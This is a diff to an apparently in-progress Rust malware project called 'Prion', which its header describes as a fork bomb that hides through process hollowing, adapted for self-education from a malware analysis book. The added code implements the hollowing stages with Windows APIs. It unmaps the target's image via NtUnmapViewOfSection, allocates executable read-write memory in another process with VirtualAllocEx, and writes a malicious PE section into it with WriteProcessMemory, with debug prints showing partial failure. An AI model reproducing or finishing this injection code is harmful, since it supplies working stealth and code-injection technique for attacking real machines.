@@ -1,5 +1,6 @@
 //Prion is a slow-moving fork bomb which tries to hide using process hollowing
-//Created for self-educational purposes - DO NOT RUN OR DISTRIBUTE!
+//Created for self-educational purposes - adapted from Malware Analyst's Cookbook
+//DO NOT RUN OR DISTRIBUTE!
 #![allow(unused_imports, unused_variables, unused_mut, safe_packed_borrows)]
 #![feature(try_from)]
 
@@ -34,8 +35,9 @@ use winapi::um::processthreadsapi::{CreateProcessW, LPPROCESS_INFORMATION, PROCE
 use winapi::shared::minwindef::{FALSE, DWORD, HINSTANCE__, LPVOID};
 use winapi::shared::basetsd::{SIZE_T};
 use winapi::shared::winerror::{HRESULT_FROM_WIN32};
-use winapi::um::memoryapi::{VirtualFreeEx, VirtualAllocEx};
+use winapi::um::memoryapi::{VirtualFreeEx, VirtualAllocEx, WriteProcessMemory};
 use winapi::um::errhandlingapi::{GetLastError};
+use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, PAGE_EXECUTE_READWRITE};
 use winapi::ctypes::c_void;
 
 
@@ -99,6 +101,15 @@ fn main() {
             dwThreadId: 0,
 	};
 	
+	/*
+	let mut proc_info = PROCESS_INFORMATION {
+            hProcess: legit_path as LPVOID,
+            hThread: null_mut(),
+            dwProcessId: 0,
+            dwThreadId: 0,
+	};
+	*/
+	
 	let mut startup_info : STARTUPINFOW = unsafe { mem::zeroed() };
 	startup_info.cb = mem::size_of::<STARTUPINFOW>() as DWORD;
 	
@@ -120,6 +131,7 @@ fn main() {
 	//legit_proc.popen();
 	
 	
+	//Part 3
 	//let mut mod_handle_str: Vec<u16> = OsStr::new("ntdll.dll").encode_wide().chain(once(0)).collect();
 	let mut mod_handle_str: Vec<u16> = OsStr::new("C:\\Windows\\System32\\ntdll.dll").encode_wide().chain(once(0)).collect();
 	
@@ -142,8 +154,7 @@ fn main() {
 							i8::try_from(*CString::new("NtUnmapViewOfSection").unwrap().as_bytes_with_nul().as_ptr()).unwrap()
 						};
 						
-	//No W version of GetProcAddress available because the universe is a harsh place
-	//Step 3
+	//No W version of GetProcAddress available
 	let mut proc_addr = unsafe {
 							//GetProcAddress (mod_handle, mal_path_i8 as *const i8)
 							GetProcAddress (mod_handle, unmap_i8 as *const i8)
@@ -169,8 +180,8 @@ fn main() {
 							//1000,
 							//Not correct, but best guess for now
 							nt_head.OptionalHeader.SizeOfImage as SIZE_T,
-							//MEM_RELEASE
-							0x8000
+							MEM_RELEASE
+							//0x8000
 							)
 					};
 	
@@ -178,7 +189,41 @@ fn main() {
 	let err = unsafe {
 				GetLastError()
 	};
+	
+	//Part 4
+	let alloc_res = unsafe {
+						VirtualAllocEx (
+							proc_info.hProcess,
+							mal_img_base as LPVOID,
+							nt_head.OptionalHeader.SizeOfImage as SIZE_T,
+							MEM_COMMIT | MEM_RESERVE,
+							PAGE_EXECUTE_READWRITE
+							)
+					};
+					
+	let err2 = unsafe {
+				GetLastError()
+	};
+	
+	//Part 4
+	let write_res = unsafe {
+						WriteProcessMemory (
+							proc_info.hProcess,
+							(mal_img_base + u64::from(section_head[0].VirtualAddress)) as LPVOID,
+							mal_buf[(section_head[0].PointerToRawData) as usize] as LPVOID,
+							section_head[0].SizeOfRawData as SIZE_T,
+							null_mut()
+							)
+					};
+	
+	//Err 299: only part of this request was completed
+	let err3 = unsafe {
+				GetLastError()
+	};
 
+	
+	
+	
 	
 	println!("PE e_magic:{:?}\n", mal_pe.dos_header().e_magic);
 	
@@ -198,7 +243,15 @@ fn main() {
 	
 	println!("free_res:\n{:?}\n", free_res);
 	
-	println!("err:\n{:?}\n", err);
+	println!("alloc_res:\n{:?}\n", alloc_res);
+	
+	println!("write_res:\n{:?}\n", write_res);
+	
+	println!("err:\n{:?}, {:?}, {:?}\n", err, err2, err3);
+	
+	println!("proc_info.hProcess:\n{:?}\n", proc_info.hProcess);
+	
+	println!("mal_img_base as LPVOID:\n{:?}\n", mal_img_base as LPVOID);
 	
 	thread::sleep(time::Duration::from_millis(10000));
 	
